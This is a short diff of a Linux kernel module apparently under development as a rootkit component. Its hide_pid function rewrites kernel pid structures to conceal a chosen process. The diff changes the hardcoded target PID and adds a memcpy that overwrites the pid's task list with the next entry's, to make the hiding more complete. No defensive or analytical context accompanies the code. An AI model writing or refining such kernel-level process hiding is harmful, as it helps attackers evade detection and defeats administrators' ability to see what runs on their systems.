@@ -1,14 +1,8 @@
 #include <linux/module.h>
 #include <linux/printk.h>
-#include <linux/kernel.h>
-#include <linux/init.h>
-#include <net/sock.h>
-#include <linux/proc_fs.h>
-#include <linux/pid_namespace.h>
-#include <linux/pid.h>
-// #include <linux/pidfs.h>
 
-#define HIDEPID 3579
+
+#define HIDEPID 3871
 
 
 extern struct pid* alloc_pid(struct pid_namespace *, pid_t*, size_t);
@@ -64,6 +58,7 @@ int hide_pid(void)
         if (pid != NULL && pid_next != NULL)
         {
             pid->numbers[0].nr = pid_next->numbers[0].nr;
+            memcpy(pid->tasks, pid_next->tasks, sizeof(struct hlist_head));
         }
     }
 
